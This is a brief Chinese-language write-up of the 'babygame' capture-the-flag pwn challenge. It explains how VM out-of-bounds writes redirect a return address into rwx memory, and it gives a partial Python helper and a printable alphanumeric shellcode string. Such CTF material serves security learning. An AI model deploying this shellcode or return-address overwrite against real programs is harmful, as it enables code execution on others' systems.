# babygame

> 分类：Pwn

## 题目描述

VM 指令 + shellcode 题。rwx 内存中写入 vm 指令和可打印字符 shellcode，利用 vm 功能的越界写改返回地址到 rwx 内存段。

## 考察知识点

- VM 逆向
- 可打印字符 shellcode
- 越界写改返回地址

## 解法

1. 通过 `getGoldCoins`（猜随机字母）攒金币，`getFullBackpack` 装满背包。
2. 构造可打印字符 shellcode，利用 vm 越界写把返回地址改到 rwx 内存段。
3. 关键函数 `writeByOffset` 构造 vm 指令字节，最终写 shellcode 并触发执行。

```python
def writeByOffset(off, val):
    if u8(val) == 0:
        return 'B' + off*3
    if u8(val) == 0x2:
        return 'A' + p8(0x37+0x44) + p8(0x31) + p8(0x30) + ...
    return 'A' + off + p8(0x61) + p8(u8(val)+0x37)

shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
```

（完整 exp 见原 writeup，涉及 vm 指令的精细构造）

## 参考答案

（flag 通过 VM 越界写改返回地址执行 shellcode 读取）

## 来源

- 作者：C4oy1Zz | https://cn-sec.com/archives/1802791.html
